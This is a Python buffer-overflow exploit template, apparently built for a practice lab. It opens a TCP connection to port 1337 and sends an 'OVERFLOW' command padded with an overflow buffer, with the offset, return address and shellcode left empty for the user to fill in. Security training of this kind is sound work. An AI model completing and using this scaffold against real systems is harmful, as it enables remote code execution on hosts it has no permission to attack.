# Copyright 2023 David Ara√∫jo, Diogo Matos, Tiago Silvestre
# 
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
#     http://www.apache.org/licenses/LICENSE-2.0
# 
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import socket, sys

# Call like
# $ python3 exploit.py "10.10.X.X" 1

ip = sys.argv[1]
id = sys.argv[2]
port = 1337

prefix = "OVERFLOW" + id + " "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""

# hex payload
payload=""

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
